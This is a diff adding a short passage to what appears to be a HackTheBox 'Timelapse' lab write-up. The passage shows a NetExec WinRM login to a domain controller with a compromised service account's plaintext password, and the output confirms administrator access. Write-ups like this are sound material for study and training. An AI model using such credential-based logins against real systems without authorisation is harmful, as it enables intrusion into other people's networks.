@@ -312,3 +312,8 @@ SMB         10.129.227.113  445    DC01             [+] timelapse.htb\svc_deploy
 ```
 This user is now compromised
 
+```python
+# nxc winrm dc01.timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'     
+WINRM-SSL   10.129.227.113  5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb) 
+WINRM-SSL   10.129.227.113  5986   DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV (admin)
+```
